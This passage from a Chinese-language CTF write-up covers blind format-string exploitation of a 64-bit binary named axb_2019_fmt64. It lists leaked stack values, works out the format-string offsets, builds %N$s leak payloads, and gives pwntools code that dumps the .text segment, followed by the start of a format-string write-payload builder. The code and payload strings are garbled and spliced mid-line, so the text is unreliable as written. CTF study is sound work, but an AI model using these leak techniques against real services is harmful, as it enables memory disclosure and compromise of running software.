    [*] 632  (nil)     
    [*] 640  0x7ffc76aacae0
    [*] 648  0x3288869db05f6500
    [*] 656  0x400970  
    [*] 664  0x7f8314c8d830
    [*] 672  (nil)     
    [*] 680  0x7ffc76aacae8
    [*] 688  0x100000000
    [*] 696  0x400816  
    [*] 704  (nil)     
    [*] 712  0x313646518db913f1
    [*] 720  0x400720  
    [*] 728  0x7ffc76aacae0
    [*] 736  (nil)     
    [*] 744  (nil)     
    [*] 752  0xceceab840b7913f1
    [*] 760  0xce306f40308913f1
    [*] 768  (nil)     
    [*] 776  (nil)     
    [*] 784  (nil)     
    [*] 792  0x7ffc76aacaf8
    [*] 800  0x7f831525e168
    [*] 808  0x7f83150477db
    [*] 816  (nil)     
    [*] 824  (nil)     
    [*] 832  0x400720  
    [*] 840  0x7ffc76aacae0
    [*] 848  (nil)     
    [*] 856  0x400749  
    [*] 864  0x7ffc76aacad8
    [*] 872  0x1c      
    [*] 880  0x1       
    [*] 888  0x7ffc76aacf37
    [*] 896  (nil)     
    [*] 904  0x7ffc76aacf41
    [*] 912  0x7ffc76aacf57
    [*] 920  0x7ffc76aacf5f
    [*] 928  0x7ffc76aacf6a
    [*] 936  0x7ffc76aacf7f
    [*] 944  0x7ffc76aacfc1
    [*] 952  0x7ffc76aacfc7
    [*] 960  0x7ffc76aacfd5
    [*] 968  (nil)     
    [*] 976  0x21      
    [*] 984  0x7ffc76bcf000
    [*] 992  0x10      
    [*] 1000 0xf8bfbff 
    [*] 1008 0x6       
    [*] 1016 0x1000    
    [*] 1024 0x11      
    [*] 1032 0x64      
    [*] 1040 0x3       
    [*] 1048 0x400040  
    [*] 1056 0x4       
    [*] 1064 0x38      
    [*] 1072 0x5       
    [*] 1080 0x9       
    [*] 1088 0x7       
    [*] 1096 0x7f8315037000
    [*] 1104 0x8       
    [*] 1112 (nil)     
    [*] 1120 0x9       
    [*] 1128 0x400720  
    [*] 1136 0xb       
    [*] 1144 0x3e8     
    [*] 1152 0xc       
    [*] 1160 0x3e8     
    [*] 1168 0xd       
    [*] 1176 0x3e8     
    [*] 1184 0xe       
    [*] 1192 0x3e8     
    [*] 1200 0x17      
    [*] 1208 (nil)     
    [*] 1216 0x19      
    [*] 1224 0x7ffc76aacc89
    [*] 1232 0x1a      
    [*] 1240 (nil)     
    [*] 1248 0x1f      
    [*] 1256 0x7ffc76aacfee
    [*] 1264 0xf       
    [*] 1272 0x7ffc76aacc99
    [*] 1280 (nil)     
    [*] 1288 (nil)     
    [*] 1296 (nil)     
    [*] 1304 0x88869db05f654f00
    [*] 1312 0xf8989b2368cfac32
    [*] 1320 0x34365f36387889
    [*] 1328 (nil)     
    [*] .... (nil) 
    [*] 1976 (nil)     
    [*] 1984 0x2e00000000000000
    [*] 1992 0x6e77702f6e77702f
    [*] 2000 0x4d414e54534f4800
    [*] 2008 0x6162616232313d45
    [*] 2016 0x5300623030313137
    [*] 2024 0x4800313d4c564c48
    [*] 2032 0x6f6f722f3d454d4f
    [*] 2040 0x6374652f3d5f0074
    [*] 2048 0x2f642e74696e692f
    [*] 2056 0x50006474656e6978
    [*] 2064 0x7273752f3d485441
    [*] 2072 0x732f6c61636f6c2f
    [*] 2080 0x7273752f3a6e6962
    [*] 2088 0x622f6c61636f6c2f
    [*] 2096 0x2f7273752f3a6e69
    [*] 2104 0x73752f3a6e696273
    [*] 2112 0x732f3a6e69622f72
    [*] 2120 0x6e69622f3a6e6962
    [*] 2128 0x46002f3d44575000
    [*] 2136 0x5f746f6e3d47414c
    [*] 2144 0x4d45520067616c66
    [*] 2152 0x54534f485f45544f
    [*] 2160 0x312e302e3437313d
    [*] 2168 0x2f2e003331322e30
    [*] 2176 0x6e77702f6e7770
    [*] 2184 (nil)
此处我们发现了在泄露序号为720和832的位置出现了相同的明显位于`.text`段中的相同地址，这就是`_start`函数的地址。
同时也已经发现了格式化字符串位置。
    [*] 336  0x7265746165706552  --> retaepeR
    [*] 344  0x2d3c70243334253a  --> - nn|-    
此时我们注意到，如果我们先填充7个字节，接下来填充的格式化字符串将位于352的位置上。
那么，我们的格式化字符串位置将实际位于`N=44`处，即偏移为44，那么我们接下来构建偏移，泄露文件。
**Dump`.text`**
此处我们首先尝试构建`payload = 'Leak-->%45$s   RAX=0x0a400720
进而会导致访址失败。
此时重新看看我们一开始泄露出的数据，仔细观察可以发现，在编号为64（N=8）的位置也有我们输入的格式化字符串，事实上，我们的输入正是从编号64开始，只是会被sprintf函数复制到编号352（N=44）的位置，而在未经过sprintf函数复制时，我们的地址末尾并不会被强制放上`x0a`，因此，我们构造的payload应当为`payload
=
'Leak--->%10$s%10$s')
    print(disasm(sh.recvuntil('%10$s')
                value = sh.recvuntil('<-|').strip('<-|')
                text_segment += value
                start_addr += len(value)
                if(len(value)==0):
                    text_segment += 'x00'
                    start_addr += 1
                if(text_segment[-9:-1]=='x00'*16):
                    break
        except Exception as e:
            print(e)
        finally:
            log.info('We get ' + str(len(text_segment)) +'byte file!')
            with open('axb_2019_fmt64_dump','wb') as fout:
                fout.write(text_segment)
    def antitone_fmt_payload(offset, writes, numbwritten=0, write_size='byte'):
        config = {
            32 : {
                'byte': (4, 1, 0xFF, 'hh', 8),
                'short': (2, 2, 0xFFFF, 'h', 16),
                'int': (1, 4, 0xFFFFFFFF, '', 32)},
            64 : {
                'byte': (8, 1, 0xFF, 'hh', 8),
                'short': (4, 2, 0xFFFF, 'h', 16),
                'int': (2, 4, 0xFFFFFFFF, '', 32)
            }